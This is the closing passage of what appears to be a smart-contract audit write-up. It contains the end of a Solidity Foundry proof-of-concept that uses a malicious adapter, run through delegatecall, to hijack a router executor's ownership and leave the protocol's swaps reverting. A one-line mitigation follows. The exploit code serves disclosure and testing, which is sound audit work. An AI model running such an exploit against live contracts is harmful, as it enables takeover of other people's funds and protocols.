</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>Utils.SimpleSwap[] <span style="color:#66d9ef">memory</span> swaps <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Utils.SimpleSwap[](<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>Utils.Adapter[] <span style="color:#66d9ef">memory</span> adapters <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Utils.Adapter[](<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>adapters[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> Utils.Adapter(<span style="color:#66d9ef">payable</span>(<span style="color:#66d9ef">address</span>(maliciousAdapter)), <span style="color:#ae81ff">1</span>e18, swaps);
</span></span><span style="display:flex;"><span>Utils.SinglePath[] <span style="color:#66d9ef">memory</span> singlePaths <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Utils.SinglePath[](<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>singlePaths[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> Utils.SinglePath(<span style="color:#66d9ef">address</span>(<span style="color:#ae81ff">0</span>), adapters);
</span></span><span style="display:flex;"><span>Utils.MultiPath[] <span style="color:#66d9ef">memory</span> multiPaths <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Utils.MultiPath[](<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>multiPaths[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> Utils.MultiPath(<span style="color:#ae81ff">1</span>e18, singlePaths);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">address</span> oldExecutorOwner <span style="color:#f92672">=</span> router.executor().owner();
</span></span><span style="display:flex;"><span>deal(<span style="color:#ae81ff">0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2</span>, <span style="color:#66d9ef">address</span>(this), <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">ether</span>);
</span></span><span style="display:flex;"><span>IERC20(<span style="color:#ae81ff">0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2</span>).approve(<span style="color:#66d9ef">address</span>(router), <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">ether</span>);
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Execute exploit swap
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>router.swap(
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2</span>,
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">ether</span>,
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x6B175474E89094C44Da98b954EedeAC495271d0F</span>,
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">true</span>,
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>feeReceiver,
</span></span><span style="display:flex;"><span>multiPaths
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">-</span>]<span style="color:#75715e">// Execute exploit swap[/-]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>deal(<span style="color:#ae81ff">0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2</span>, <span style="color:#66d9ef">address</span>(this), <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">ether</span>);
</span></span><span style="display:flex;"><span>IERC20(<span style="color:#ae81ff">0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2</span>).approve(<span style="color:#66d9ef">address</span>(router), <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">ether</span>);
</span></span><span style="display:flex;"><span><span style="color:#75715e">//now owner of executor is hijacked
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//reentrancyguard status is down (not nonReentrant)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>assert(router.executor().owner() <span style="color:#f92672">!=</span> oldExecutorOwner);
</span></span><span style="display:flex;"><span><span style="color:#75715e">// protocol is haulted and a DOS is carried out !!
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>vm.expectRevert();
</span></span><span style="display:flex;"><span>router.swap(
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2</span>,
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">ether</span>,
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x6B175474E89094C44Da98b954EedeAC495271d0F</span>,
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">true</span>,
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>feeReceiver,
</span></span><span style="display:flex;"><span>multiPaths
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>receive() <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">payable</span> {}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h3 id="mitigation">Mitigation</h3>
<p>1.Remove <code>delegatecall</code>, use <code>call</code> instead</p>

  
  <hr>
<div class="footer">
    
    
    
    <p>
    This is a post in the <b><a href="http://localhost:1313/series/audits-web3-security">Audits &amp; Web3 Security</a></b> series.
        <br>Other posts in this series:
        <ul class="series">
            
            
            
        </ul>
    </p>
    
</div>

  
</div>
            </main>
            
  
    <div class="article-toc ">
    <div class="toc-wrapper">
      <h4 id="contents"></h4>
      <nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li><a href="#summary">Summary</a></li>
        <li><a href="#root-cause">Root Cause</a></li>
        <li><a href="#external-pre-conditions">External Pre-conditions</a></li>
        <li><a href="#attack-path">Attack Path</a></li>
        <li><a href="#impact">Impact</a></li>
        <li><a href="#poc">PoC</a></li>
        <li><a href="#mitigation">Mitigation</a></li>
      </ul>
    </li>
  </ul>
</nav>
    </div>
</div>

  

        </div>
    </body>
</html>
